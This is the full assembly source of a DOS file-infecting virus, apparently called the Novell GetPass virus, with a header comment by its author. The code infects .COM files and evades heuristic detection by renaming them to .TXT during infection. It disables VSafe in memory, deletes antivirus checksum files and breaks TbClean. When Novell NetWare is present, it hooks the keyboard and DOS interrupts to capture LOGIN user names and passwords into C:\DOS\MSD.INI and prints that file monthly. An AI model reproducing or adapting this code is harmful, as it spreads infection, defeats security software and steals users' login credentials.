;=============================================================================
;     Please feel free to distribute, but do NOT change and say it's your's!
;=============================================================================
;     You are now looking at the source code of the Novell GetPass virus!
;     Stop doing so! But if you don't well, ok! The GetPass virus is fairly
;     unique in some parts of it's behaviour. It infects *.COM files using
;     an infection interrupt routine.(INT D0) It first renames the files
;     it infects to a *.TXT file to avoid heuristic alarms of some rule
;     based TSR's and then restores the original extention. Some resident
;     anti-viral products will be completely disabled in memory and their
;     CRC check files will be deleted. The GetPass routine will become
;     resident if the virus detects that NETX (Novell NetWare) is loaded
;     in memory, hooking INT 16 (keyboard) and INT 21 in memory.
;     The GetPass routine activates when LOGIN is executed. The users login
;     name and his/her password will be captured and written to a file wich
;     will be created in C:\DOS.(the file is MSD.INI) If the file becomes
;     approximatly 8Kb, the virus deletes the file. This to avoid a very large
;     file in the DOS directory. A new file will be created and the logging
;     will continue. Every first day of the month, when an infected program
;     is executed the file containing the names/passwords is printed if there
;     is a printer available. The virus does not infect COMMAND.COM.
;     
;     Greetings ,ThE wEiRd GeNiUs
;
;     PS: Check your MSD.INI file once in a while!
;-----------------------------------------------------------------------------
;            Assemble with TASM 2.0 or higher, Link with TLINK /T
;-----------------------------------------------------------------------------
	CODE    SEGMENT
	ASSUME  CS:CODE,DS:CODE,ES:CODE,SS:CODE

	CRYPTLEN EQU     CHKTIME-CSTART-1;Length to en/decrypt.
	VIRLEN   EQU     BUFFER-VSTART  ;Length of virus.
	MINLEN   EQU     1000           ;Min file length to infect.
	MAXLEN   EQU     0F230h         ;Max  "      "    "    "
	CR       EQU     0Dh            ;Return.
	LF       EQU     0Ah            ;Line feed.
	TAB      EQU     09h            ;Tab.
	INTRO    EQU     LBIT-INAME     ;
	TSRLEN   EQU     LASTBYT-TSR    ;Length of activation TSR.
	TSR2LEN  EQU     NOTENC-INFECT+1;Length of infection Interrupt.
	LENGTH   EQU     VAL_1-CSTART   ;Length of encrypted code.
	KBUFF    EQU     KEYBUFF-TSR    ;\
	KPTR     EQU     KEYPTR-TSR     ;
	FN       EQU     FNAME-TSR      ;
	LOGINL   EQU     LOGIN-TSR      ;
	KFLAG    EQU     KBFLAG-TSR     ;  Offsets in activation TSR.
	INTOF    EQU     INT21-TSR      ;
	INT16L   EQU     INT16-TSR      ;
	OLD16L   EQU     NINT16-TSR     ;
	NINTOF   EQU     NINT21-TSR     ;
	COUCR    EQU     CCOUNT-TSR     ;
	PARLEN   EQU     PARAM-TSR      ;/

	ORG     0100h

	.RADIX  16
;-----------------------------------------------------------------------------
; Infected dummy program. (Only in 1st run)
;-----------------------------------------------------------------------------
START:  JMP     VSTART                  ;Jump to virus code.
;-----------------------------------------------------------------------------
; Begin of the virus code.
;-----------------------------------------------------------------------------
VSTART: CALL    CHKDOS                  ;-Confuse anti-viral progs.
	CALL    CHKTIME                 ;/
BEGIN:  CALL    ENCRYP                  ;Call decryption routine.
;-----------------------------------------------------------------------------
; From here the code will be encrypted.
;-----------------------------------------------------------------------------
CSTART: CALL    BEGIN1                  ;Same old trick.
	CALL    RESBEG                  ;Restore begin.
	CALL    CHKDRV                  ;Check drive & DOS version.
	CALL    SAVEDIR                 ;Save startup directory.
	PUSH    ES                      ;In the next sessions ES is modified.
	CALL    INT24                   ;NoErrorAllowed.
	CALL    VSAFE                   ;Vsafe resident?
	CALL    ACTIVE                  ;Install password routine.
	POP     ES                      ;Restore extra segment.
	CALL    ENKEY                   ;Create new CRYPTKEY.
	CALL    INSTSR2                 ;Place infection routine in memory.
	CALL    DTA                     ;Store old and give up new DTA addres.
	CALL    FIND1                   ;Determine how many path's are present.
	CALL    RANDOM                  ;Random value for directory search.
	CALL    FIND2                   ;Find suitable directory.
	CALL    CHDRIVE                 ;If it is on another drive.
	CALL    GODIR                   ;Go to the selected directory.
F_FIRST:MOV     AH,4Eh                  ;Search for 1st *.COM
	MOV     CX,110b                 ;Look for read only, system & hidden.
	LEA     DX,[BP+OFFSET SPEC]     ;Offset file specification.(*.COM)
	INT     21h                     ;Call DOS.
	JNC     OPENF                   ;Exit if no file found.
	CALL    EXIT1                   ;No files found, quit.
OPENF:  CALL    CHKCOM                  ;-Is it COMMAND.COM?
	CMP     CX,00h                  ;/
	JE      LETSGO                  ;Yes, do NOT infect.
	CALL    CHKINF                  ;Already infected?
	CALL    ATTRIB                  ;Ask & clear file attributes.
	CALL    RENAME                  ;Rename to *.TXT file.
	MOV     AH,4Eh                  ;Search the name.TXT file.
	MOV     CX,110b                 ;Read only, system & hidden.
	LEA     DX,[BP+OFFSET NEWNAM]   ;Offset file specification.(name.TXT)
	INT     21h                     ;Call DOS.
	MOV     AX,3D02h                ;Open file with read and write access.
	LEA     DX,[BP+OFFSET NEWNAM]   ;Offset file specification.(name.TXT)
	INT     21h                     ;Call DOS.
	MOV     BYTE PTR[BP+OFFSET HANDLE],AL;Save file handle.
	CALL    STIME                   ;Save file date & time.
CHECK:  MOV     AH,3Fh                  ;Read begin of victim.
	MOV     CX,3                    ;Read Begin.
	LEA     DX,[BP+OFFSET ORIGNL]   ;Into offset original instructions.
	INT     21h                     ;Call DOS.
	JC      CLOSE                   ;On error, quit.
REPLACE:CALL    BPOINT                  ;Move file pointer to end of victim.
	SUB     AX,3                    ;Calculate new jump.
	MOV     WORD PTR[BP+NEWJMP+1],AX;Store new jump value.
	MOV     AX,4200h                ;Move file pointer to begin.
	XOR     CX,CX                   ;Zero high nybble.
	XOR     DX,DX                   ;Zero low nybble.
	INT     21h                     ;Call DOS.
	MOV     AH,40h                  ;Write to file,
	MOV     CX,3                    ;3 Bytes.
	LEA     DX,[BP+OFFSET NEWJMP]   ;Offset new jump value.
	INT     21h                     ;Call DOS.
	CALL    BPOINT                  ;Move file pointer to end.
	JMP     INFEC                   ;Create encryption key.
LETSGO: MOV     AH,4Fh                  ;Find next.
	INT     21h                     ;Call DOS.
	JC      EXIT                    ;On error, quit.
	JMP     OPENF                   ;Open new victim.
INFEC:  MOV     DL,[BP+OFFSET VAL_1]    ;Encryption value into DL.
	INT     0D0h                    ;Neat way to infect a file!
CLOSE:  CALL    RTIME                   ;Restore File time & date.
	MOV     AH,3Eh                  ;Close file.
	INT     21h                     ;Call DOS.
	CALL    RENAME2                 ;Restore back to COM file.
	CALL    RATTRIB                 ;Restore File attributes.
;-----------------------------------------------------------------------------
EXIT:   CALL    DELSTUF                 ;Delete CRC checkers.
EXIT1:  MOV     AH,1Ah                  ;Restore old DTA.
	MOV     DX,[BP+OFFSET OLD_DTA]  ;Old DTA address.
	INT     21h                     ;Call DOS.
EXIT2:  MOV     AH,0Eh                  ;Restore startup drive.
	MOV     DL,BYTE PTR[BP+OFFSET OLDRV];Old drive code.
	INT     21h                     ;Call DOS.
	MOV     AH,3Bh                  ;Goto startup directory,
	LEA     DX,[BP+OFFSET BUFFER]   ;that is stored here.
	INT     21h                     ;Call DOS.
EXIT3:  CALL    RINT24                  ;Restore original INT 24
EXIT4:  MOV     AX,100h                 ;
	PUSH    AX                      ;
	RET                             ;Pass control to HOST.
;-----------------------------------------------------------------------------
DUMEX:  MOV     DI,0100h                ;This is a dummy exit, it screws up
	LEA     SI,[BP+DEXIT]           ;TbClean. In stead of cleaning the
	MOV     CX,3                    ;phile, it puts a program terminating
	REPNZ   MOVSB                   ;interrupt in the beginning of the 
	MOV     AX,0100h                ;victim, neat huh!
	PUSH    AX                      ;
	RET                             ;
;-----------------------------------------------------------------------------
BETWEEN:MOV     AH,3Eh                  ;Close the file.
	INT     21h                     ;Call DOS
	JMP     LETSGO                  ;Find next file.
CHKINF: MOV     AX,3D00h                ;Open file with only read acces.
	MOV     DX,WORD PTR[BP+OFFSET NP];Offset filename.
	INT     21h                     ;Call DOS.
	MOV     BX,AX                   ;File handle into BX.
	MOV     CX,0FFFFh               ;- Move -3 into CX,DX.
	MOV     DX,0FFFCh               ;/
	MOV     AX,4202h                ;Move file pointer to end-3
	INT     21h                     ;Call DOS.
	MOV     AH,3Fh                  ;Read file.
	MOV     CX,01h                  ;One Byte.
	LEA     DX,[BP+OFFSET MARK1]    ;Into this address.
	INT     21h                     ;Call DOS.
	CMP     BYTE PTR [BP+OFFSET MARK1],43h; Is it infected?
	JE      BETWEEN                 ;Yes, find another.
	CALL    BPOINT                  ;Go to EOF.
	CMP     AX,MAXLEN               ;Is the file to long?
	JNB     BETWEEN                 ;Yes, find another.
	CMP     AX,MINLEN               ;Is it to short?
	JBE     BETWEEN                 ;Yes, find another.
	MOV     AH,3Eh                  ;Close the file.
	INT     21h                     ;Call DOS
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
CHKDRV: CALL    CHKDOS                  ;Check DOS version.
	CMP     AL,01                   ;
	JB      DUMEX                   ;Screw up TbClean.
	CMP     AL,05h                  ;Is it DOS 5.0 or higher?
	JNGE    EXIT4                   ;No, exit.
	MOV     AH,19h                  ;Get drive code.
	INT     21h                     ;Call DOS.
	MOV     BYTE PTR[BP+OFFSET OLDRV],AL;Save old drive code.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RESBEG: LEA     SI,[BP+OFFSET ORIGNL]   ;Offset original begin.
	MOV     DI,0100h                ;Restore original instructions.
	MOV     CX,3                    ;Restore 3 bytes.
	REPNZ   MOVSB                   ;Move them.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
CHKCOM: MOV     CX,05                   ;CX=len COMMAND.
	MOV     DI,[BP+OFFSET NP]       ;Offset found file.
	LEA     SI,[BP+OFFSET COMMND]   ;Offset COMMAND.
	REPZ    CMPSB                   ;Compare the strings.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RENAME: MOV     CX,0Ch                  ;       This section renames the
	MOV     SI,WORD PTR[BP+OFFSET NP];      found and approved for
	LEA     DI,WORD PTR[BP+OFFSET NEWNAM];  infection file to a
	REPNZ   MOVSB                   ;       *.TXT file. The reason for
	LEA     BX,WORD PTR[BP+OFFSET NEWNAM-1];this is that VPROTECT from
LPOINT: INC     BX                      ;       Intel has a rule based NLM.
	CMP     BYTE PTR[BX],'.'        ;       If we write to a COM file
	JNE     LPOINT                  ;       VPROTECT gives an alarm
	MOV     DI,BX                   ;       message. However, if we
	MOV     WORD PTR[BP+OFFSET TXTPOI],BX;  write to a text file....
	LEA     SI,[BP+OFFSET TXT]      ;       Pretty solution isn't it?
	MOVSW                           ;
	MOVSW                           ;
	MOV     DX,WORD PTR[BP+OFFSET NP];
	LEA     DI,WORD PTR[BP+OFFSET NEWNAM];
	MOV     AH,56h                  ;Rename file function.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RENAME2:LEA     SI,[BP+OFFSET SPEC+1]   ;       In this section we
	MOV     DI,WORD PTR[BP+OFFSET TXTPOI];  give the infected file
	MOVSW                           ;       its old extention back.
	MOVSW                           ;       (*.COM)
	MOV     DX,WORD PTR[BP+OFFSET NP];
	LEA     DI,WORD PTR[BP+OFFSET NEWNAM];
	MOV     AH,56h                  ;Rename file function.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
ENKEY:  CALL    CHKTIME                 ;Get time.
	MOV     BYTE PTR[BP+OFFSET VAL_1],DL;New encryption key.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
SAVEDIR:MOV     BYTE PTR[BP+OFFSET BUFFER],5Ch;Put a slash in DTA.
	MOV     DL,BYTE PTR[BP+OFFSET OLDRV];Drive code.
	INC     DL                      ;DL+1 because functions differ.
	MOV     AH,47h                  ;Get current directory.
	LEA     SI,[BP+OFFSET BUFFER+1] ;Store current directory.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
DTA:    MOV     AH,2Fh                  ;Get DTA address.
	INT     21h                     ;Call DOS.
	MOV     WORD PTR[BP+OFFSET OLD_DTA],BX; Save here.
	LEA     DX,[BP+OFFSET NEW_DTA]  ;Offset new DTA address.
	MOV     AH,1Ah                  ;Give up new DTA.
	INT     21                      ;Call DOS.
	ADD     DX,1Eh                  ;Filename pointer in DTA.
	MOV     WORD PTR[BP+OFFSET NP],DX;Put in name pointer.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
INT24:  MOV     AX,3524h                ;Get int 24 handler.
	INT     21h                     ;into [ES:BX].
	MOV     WORD PTR[BP+OLDINT],BX  ;Save it.
	MOV     WORD PTR[BP+OLDINT+2],ES;
	MOV     AH,25h                  ;Set new int 24 handler.
	LEA     DX,[BP+OFFSET NEWINT]   ;DS:DX->new handler.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RINT24: PUSH    DS                      ;Save data segment.
	MOV     AX,2524h                ;Restore int 24 handler
	LDS     DX,[BP+OFFSET OLDINT]   ;to original.
	INT     21h                     ;Call DOS.
	POP     DS                      ;Restore data segment.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
VSAFE:  MOV     AX,3516h                ;Get interrupt vector INT 16.
	INT     21h                     ;(Now we know in wich segment it is.)
	MOV     WORD PTR[BP+OFFSET NINT16],BX;  - Store old INT 16 in TSR.
	MOV     WORD PTR[BP+OFFSET NINT16+2],ES;/
	ADD     BX,0364h                ;Here we find a jump that w'ill change.
	CMP     WORD PTR[ES:BX],0945h   ;Is it THE jump?
	JNE     OK_9                    ;No, already modified or not resident.
	MOV     WORD PTR[ES:BX],086Dh   ;Yes, modify it.
OK_9:   RET                             ;Return to caller. No Vsafe.
;-----------------------------------------------------------------------------
FIND1:  MOV     BYTE PTR[BP+OFFSET VAL_2],0FFh; This routine is derivied from
	MOV     BX,01h                  ; the VIENNA virus.
FIND2:  PUSH    ES                      ;- Save registers.
	PUSH    DS                      ;/
	MOV     ES,DS:2CH               ;
	MOV     DI,0                    ;ES:DI points to environment.
FPATH:  LEA     SI,[BP+OFFSET PATH]     ;Point to "PATH=" string in data area.
	LODSB                           ;
	MOV     CX,OFFSET 8000H         ;Environment can be 32768 bytes long.
	REPNZ   SCASB                   ;Search for first character.
	MOV     CX,4                    ;Check if path
LOOP_2: LODSB                           ;is complete.
	SCASB                           ;
	JNZ     FPATH                   ;If not all there, abort & start over.
	LOOP    LOOP_2                  ;Loop to check the next character.
	XCHG    SI,DI                   ;Exchange registers.
	MOV     CL,BYTE PTR[BP+OFFSET VAL_2];Random value in CL.
	PUSH    ES                      ;\
	POP     DS                      ;-) Get DS, ES on address.
	POP     ES                      ;/
OK_14:  LEA     DI,[BP+OFFSET NEW_DTA+50];Offset address path.
OK_10:  MOVSB                           ;Get name in path.
	MOV     AL,[SI]                 ;
	CMP     AL,0                    ;Is it at the end?
	JE      OK_11                   ;Yes, replicate.
	CMP     AL,3Bh                  ;Is it ';'?
	JNE     OK_10                   ;Nope, next letter.
	INC     SI                      ;For next loop. ';'=';'+1.
	INC     BX                      ;
	LOOP    OK_14                   ;Loop until random value = 0.
OK_11:  POP     DS                      ;Restore data segment.
	MOV     AL,0                    ;Place space after the directory.
	MOV     [DI],AL                 ;
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
DELSTUF:MOV     BX,01h                  ;Set counter
	PUSH    BX                      ;and push it.
	LEA     DX,[BP+OFFSET MICRO]    ;Is there a CHKLIST.MS file?
	JMP     INTER                   ;Check it out.
SECOND: LEA     DX,[BP+OFFSET TBAV]     ;Is there a ANTI-VIR.DAT file?
	INC     BX                      ;Increase counter
	PUSH    BX                      ;and push it.
	JMP     INTER                   ;Check it out.
THIRD:  LEA     DX,[BP+OFFSET CENTRAL]  ;Is there a CHKLIST.CPS file?
	INC     BX                      ;Increase counter
	PUSH    BX                      ;and push it
INTER:  MOV     AH,4Eh                  ;Find first matching entry.
	MOV     CX,110b                 ;Search all attributes.
	INT     21h                     ;Call DOS.
	JC      NODEL                   ;No match, find next.
	CALL    ATTRIB                  ;Clear attributes.
	MOV     AH,41h                  ;Delete file.
	INT     21h                     ;Call DOS.
NODEL:  POP     BX                      ;Pop counter.
	CMP     BX,01                   ;Had the first one?
	JE      SECOND                  ;Yes, do the second.
	CMP     BX,02                   ;Was it the second?
	JE      THIRD                   ;Yes, do the third.
	RET                             ;Finished, return to caller.
;-----------------------------------------------------------------------------
CHDRIVE:MOV     CX,0FFFFh               ;Clear CX.
	MOV     BL,'A'-1                ;AH=40
OK_15:  INC     BL                      ;AH=41='A'
	INC     CX                      ;CX=1
	CMP     BL,BYTE PTR[BP+OFFSET NEW_DTA+50];New drive letter.
	JNE     OK_15                   ;Not the same, go again.
	MOV     DL,CL                   ;Calculated the new drive code.
	MOV     AH,0Eh                  ;Give up new drive code.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RTIME:  MOV     AX,5701h                ;Restore time & date.
	MOV     CX,WORD PTR[BP+OFFSET TIME];Old time.
	MOV     DX,WORD PTR[BP+OFFSET DATE];Old date.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
STIME:  MOV     AX,5700h                ;Get file date & time.
	MOV     BX,[BP+OFFSET HANDLE]   ;File Handle.
	INT     21h                     ;Call DOS.
	MOV     WORD PTR[BP+OFFSET TIME],CX;Store time.
	MOV     WORD PTR[BP+OFFSET DATE],DX;Store date.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
BPOINT: XOR     DX,DX                   ;Zero register.
	MOV     AX,4202h                ;Move file pointer to top.
	XOR     CX,CX                   ;Zero register.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
ACTIVE: PUSH    DS                      ;Save register.
	INT     17h                     ;Check for NETX.
	CMP     AH,01h                  ;NETX resident?
	JNE     RESID                   ;Nope, do not install TSR.
	CALL    CREATE                  ;If not exsists, create password file.
	CALL    TIMER                   ;Time to print the password file?
	MOV     AX,3D3Dh                ;Do resident check.
	INT     21h                     ;Call BIOS.
	CMP     AX,1111h                ;Already resident?
	JE      RESID                   ;If so, exit.
	MOV     AX,0044h                ;Move code into hole in system
	MOV     ES,AX                   ;memory.
	MOV     DI,0100h                ;ES:BX = 0044:0100
	LEA     SI,[BP+OFFSET TSR]      ;Begin here
	MOV     CX,TSRLEN               ;and this many bytes.
	REP     MOVSB                   ;Do it.
	MOV     DS,CX                   ;Get original INT 21 vector
	MOV     SI,0084h                ;DS:SI = 0000:0084
	MOV     DI,0100h+NINTOF         ;Store it in TSR
	MOVSW                           ;One word,
	MOVSW                           ;and another.
	PUSH    ES                      ;Restore register.
	POP     DS                      ;Restore register
	MOV     AX,2521h                ;Give up new INT 21 vector.
	MOV     DX,0100h+INTOF          ;Offset new INT 21.
	INT     21h                     ;Call DOS.
	MOV     AX,2516h                ;Give up new INT 16 vector.
	MOV     DX,0100h+INT16L         ;Offset new INT 16.
	INT     21h                     ;Call DOS.
RESID:  POP     DS                      ;- Restore register.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
TSR:    DB      0                       ; This is THE cool part!
;-----------------------------------------------------------------------------
INT21:  CMP     AX,4B00h                ;Execute?
	JE      OK_16                   ;Yep, do IT !
	CMP     AX,3D3Dh                ;Resident check?
	JNE     DO_OLDI                 ;Nope, do original INT 21.
	MOV     AX,1111h                ;Give up resident FLAG.
	IRET                            ;Return to viral code.
DO_OLDI:JMP     DWORD PTR CS:[0100+NINTOF];Do the original INT 21.
OK_16:  PUSH    BX                      ;\
	PUSH    CX                      ; \
	PUSH    DX                      ;  ) Save registers.
	PUSH    DS                      ; /
	PUSH    ES                      ;/
	MOV     SI,0                    ;
	MOV     BX,DX                   ;Name pointer into BX.
HERE:   CMP     BYTE PTR[BX],'.'        ;Is it a point?
	JE      FOLLOW                  ;Yes, collected the name, cont.
	INC     BX                      ;BX+1
	JMP     HERE                    ;Get next character.
FOLLOW: SUB     BX,05h                  ;Because LOGIN is 5 characters.
THERE:  MOV     AL,BYTE PTR [CS:0100+LOGINL+SI];Char into AL.
	CMP     BYTE PTR[BX+SI],'.'     ;Did we make it until the point?
	JE      GETPASS                 ;It is LOGIN, get the password!
	XOR     AL,DS:[BX+SI]           ;(XOR LOGIN,LOGIN)
	JZ      FOLLOW1                 ;If XOR = 0 we have an equal char.
	JMP     ISNOT                   ;If not, well execute and do nothing.
FOLLOW1:INC     SI                      ;Next char.
	JMP     THERE                   ;And compare again. (we must be shure.)
ISNOT:  JMP     ENDPARS                 ;Return to caller.
LOGIN   DB      'LOGIN',0               ;Used to compare.
KBFLAG  DB      0                       ;Keyboard interrupt activation flag.
FNAME   DB      'C:\DOS\MSD.INI',0      ;Password file specification.
KEYPTR  DW      0                       ;Keyboard pointer.
CCOUNT  DB      0                       ;\
CRETURN DB      0                       ;/ Carriage return counter.
;-----------------------------------------------------------------------------
GETPASS:MOV     BYTE PTR[CS:0100+KFLAG],0FFh;Set interrupt 16 flag.
	POP     ES                      ;\
	POP     DS                      ; \
	POP     DX                      ;  ) Restore registers.
	POP     CX                      ; /
	POP     BX                      ;/
	PUSH    BX                      ;\
	PUSH    CX                      ; \
	PUSH    DX                      ;  ) Save registers.
	PUSH    DS                      ; /
	PUSH    ES                      ;/
	MOV     DS,ES:[BX+04]           ;\  Get param.pointer  ES:SI
	MOV     SI,ES:[BX+02]           ;/
	PUSH    CS                      ; \
	POP     ES                      ;  ) Get keybuff pointer DS:DI
	MOV     DI,OFFSET[CS:0100+KBUFF]; /
	XOR     CX,CX                   ;
	MOV     CL,BYTE PTR DS:[SI]     ;CX IS PARAM.LEN.
	INC     SI                      ;
	INC     SI                      ;
	CMP     CL,10h                  ;
	JG      ENDPARS                 ;
	CMP     CL,00h                  ;No parameters.
	JE      BRANCH                  ;
	MOV     BYTE PTR[CS:0100+COUCR],01h;
ENDFD:  INC     CX                      ;       
	MOV     WORD PTR[CS:0100+KPTR],CX;Set keyb.index op len param.
	DEC     CX                      ;
	REPNZ   MOVSB                   ;
	MOV     BYTE PTR ES:[DI-1],CR   ;
	MOV     BYTE PTR ES:[DI],LF     ;
	JMP     ENDPARS                 ;
BRANCH: MOV     BYTE PTR[CS:0100+COUCR],02h;
ENDPARS:POP     ES                      ;\
	POP     DS                      ;  \
	POP     DX                      ;   ) Restore registers.
	POP     CX                      ;  /
	POP     BX                      ;/
	MOV     AX,4B00h                ;
	JMP     DWORD PTR CS:[0100+NINTOF];Do the original INT 21.
PARAM   DB      0                       ;
;-----------------------------------------------------------------------------
INT16:  CMP     BYTE PTR[CS:0100+KFLAG],0FFh;Is it login.?
	JE      NEXTCHK                 ; Yes! Get the password!
THE_END:JMP     DWORD PTR[CS:0100+OLD16L];Nope, do old INT 16.
NEXTCHK:CMP     AH,00h                  ; Keyboard funtion call?
	JE      TAKCHAR                 ; Yes, continue.
	CMP     AH,10h                  ; Keyboard function call?
	JNE     THE_END                 ;
TAKCHAR:PUSHF                           ;Push flag register.
	CALL    DWORD PTR[CS:0100+OLD16L];Call old INT 16.
	PUSH    DS                      ;\
	PUSH    CS                      ;  \
	POP     DS                      ;    \
	PUSH    AX                      ;     ) Save regs and set DS
	PUSH    BX                      ;    /
	PUSH    CX                      ;  /
	PUSH    DX                      ;/
	CMP     AL,00H                  ;  No key typed
	JE      RESREGS                 ;
	MOV     BX,WORD PTR[CS:0100+KPTR]; Keybuf index
	CMP     BX,001Bh                ;  Max. length of kbuff.
	JGE     RESREGS                 ;  End int16
	CMP     AL,CR                   ;  If key = <Return>
	JE      COUNTCR                 ;
BACK:   MOV     BYTE PTR[CS:0100+KBUFF+BX],AL; Copy char into KBuffer
	INC     BX                      ;
	MOV     WORD PTR[CS:0100+KPTR],BX;
RESREGS:POP     DX                      ;\
	POP     CX                      ;  \
	POP     BX                      ;   ) Restore regs.
	POP     AX                      ;  /
	POP     DS                      ;/
	IRET                            ; Return
COUNTCR:MOV     AL,LF                   ;Line feed into AL.
	DEC     BYTE PTR[CS:0100+COUCR] ;Decrease CR counter.
	CMP     BYTE PTR[CS:0100+COUCR],00h;Is it zero?
	JE      OVER_2                  ;Nope, continue logging.
	MOV     BYTE PTR[CS:0100+KBUFF+BX],CR; Copy char into KBuffer
	INC     BX                      ;
	MOV     WORD PTR[CS:0100+KPTR],BX;
	MOV     AL,LF                   ;       
	JMP     BACK                    ;
OVER_2: MOV     AL,CR                   ;CR into AL.
	MOV     BYTE PTR[CS:0100+KBUFF+BX],AL;Copy CR into KBuffer.
	INC     BX                      ;Increase buffercounter.
	MOV     BYTE PTR[CS:0100+KBUFF+BX],LF;Copy char into KBuffer.
	INC     BX                      ;Increase buffercounter.
	MOV     BYTE PTR[CS:0100+KBUFF+BX],LF;Copy char into KBuffer.
	CALL    WFILE                   ;Write buffer to the logfile.
	MOV     BYTE PTR[CS:0100+KFLAG],00h;
	MOV     WORD PTR[CS:0100+KPTR],00h;
	JMP     RESREGS                 ;Restore registers.
WFILE:  PUSH    AX                      ;\
	PUSH    BX                      ;
	PUSH    DX                      ; Save registers.
	PUSH    CX                      ;
	PUSH    DS                      ;/
	PUSH    CS                      ;\ Get Data segment on address.
	POP     DS                      ;/
	MOV     AX,3D02h                ;Open file function.
	MOV     DX,OFFSET[CS:0100+FN]   ;Offset file spec.
	INT     21h                     ;Call DOS.
	JC      FAILURE                 ;On error, quit.
	XCHG    BX,AX                   ;Into BX.
	MOV     AX,4202h                ;Mov file handle to EOF.
	XOR     CX,CX                   ;CX=0
	XOR     DX,DX                   ;DX=0
	INT     21h                     ;Call DOS.
	CMP     AX,2000h                ;File on max lenght?
	JGE     FAILURE                 ;If so, exit.
WRITE:  MOV     CX,CS:[0100+KPTR]       ;BX = keyboard pointer.
	ADD     CX,03h                  ;+3.
	MOV     DX,OFFSET CS:[0100+KBUFF];Offset keyboard buffer.
	MOV     AH,40h                  ;Write to file function.
	INT     21h                     ;Call DOS.
FCLOSE: MOV     AH,3Eh                  ;Close file funtion.
	INT     21h                     ;Call DOS.
FAILURE:POP     DS                      ;\
	POP     DX                      ;
	POP     CX                      ; Restore registers.
	POP     BX                      ;
	POP     AX                      ;/
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
NINT21: DW      0                       ;- Original INT 21 vector.
	DW      0                       ;/
NINT16: DW      0                       ;- Original INT 16 vector.
	DW      0                       ;/
KEYBUFF DB      1dh DUP (?)             ;Keyboard buffer.
LASTBYT:DB      0                       ;Last Resident Byte.
;-----------------------------------------------------------------------------
ATTRIB: MOV     DX,WORD PTR[BP+OFFSET NP];Offset in DTA.
	MOV     AX,4300h                ;Ask file attributes.
	INT     21h                     ;Call DOS.
	LEA     BX,[BP+OFFSET ATTR]     ;Save address for old attributes.
	MOV     [BX],CX                 ;Save it.
	XOR     CX,CX                   ;Clear file attributes.
	MOV     AX,4301h                ;Write file attributes.
	INT     21h                     ;Call DOS.
	JNC     OK                      ;No error, proceed.
	CALL    EXIT                    ;Oh Oh, error occured. Quit.
OK:     RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RATTRIB:LEA     DX,[BP+OFFSET NEWNAM]   ;Offset file specification.(name.TXT)
	LEA     BX,[BP+OFFSET ATTR]     ;Offset address old attributes.
	MOV     CX,[BX]                 ;Into CX.
	MOV     AX,4301h                ;Write old values back.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
GODIR:  LEA     DX,[BP+OFFSET NEW_DTA+52];Offset directory spec.
	MOV     AH,3Bh                  ;Goto the directory.
	INT     21h                     ;Call DOS.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
RANDOM: CALL    CHKTIME                 ;Get system time.
	MOV     CX,0                    ;Figure this out by yourself.
	MOV     AX,100d                 ;It is a random generator with
OK_19:  INC     CX                      ;two variable inputs.
	SUB     AX,BX                   ;A: How many dir's in the path.
	CMP     AX,01d                  ;B: Random system time. (jiffies)
	JGE     OK_19                   ;With this values, we create a
	XOR     BX,BX                   ;random value between 1 and A.
OK_20:  INC     BX                      ;
	SUB     DL,CL                   ;
	CMP     DL,01d                  ;
	JGE     OK_20                   ;
	MOV     BYTE PTR[BP+OFFSET VAL_2],BL;Save value.
	RET                             ;Return to caller.
;-----------------------------------------------------------------------------
BEGIN1: PUSH    SP                      ;
	POP     BX                      ;Everything is related to BP.
	MOV     BP,WORD PTR[BX]         ;
	SUB     BP,10Fh                 ;In first run BP=0
	RET                             ;
;-----------------------------------------------------------------------------
NEWINT: MOV     AL,03h                  ;New INT 24.
	IRET                            ;No more write protect errors!
;-----------------------------------------------------------------------------
TIMER:  PUSH    DS                      ;Save data segment.
	MOV     AX,0044h                ;\
	MOV     DS,AX                   ;- DS=resident segment.
	CMP     BYTE PTR[DS:0100],01h   ;Already printed the file?
	POP     DS                      ;Restore data segment.
	JE      NOPRINT                 ;Yes, once is enough.
	MOV     AH,2Ah                  ;Get system date.
	INT     21h                     ;Call DOS.
	CMP     DL,01h                  ;Is it the 1st of the month?
	JNE     NOPRINT                 ;Nope, don't print the passwords.
	MOV     AX,3D01h                ;Open device PRN (printer)
	LEA     DX,[BP+OFFSET PRINT]    ;Offset spec.
	INT     21h                     ;Call DOS.
	MOV     DI,AX                   ;Save handle.
	MOV     AX,3D00h                ;Open Password file.
	LEA     DX,[BP+OFFSET FNAME]    ;File spec.
	INT     21h                     ;Call DOS.
	MOV     SI,AX                   ;Save handle.
GOPRINT:MOV     AH,3Fh                  ;Read file function.
	MOV     BX,SI                   ;File handle into BX.
	MOV     CX,01h                  ;Read one byte.
	LEA     DX,[BP+OFFSET OUTPUT]   ;Into this address.
	INT     21h                     ;Call DOS.
	CMP     AL,0                    ;EOF?
	JE      READY                   ;If equal, ready.
	MOV     AH,40h                  ;Write to file function.
	MOV     BX,DI                   ;File handle into BX.
	MOV     CX,01h                  ;Write one byte.
	LEA     DX,[BP+OFFSET OUTPUT]   ;Offset output.
	INT     21h                     ;Call DOS.
	JMP     GOPRINT                 ;Next byte.
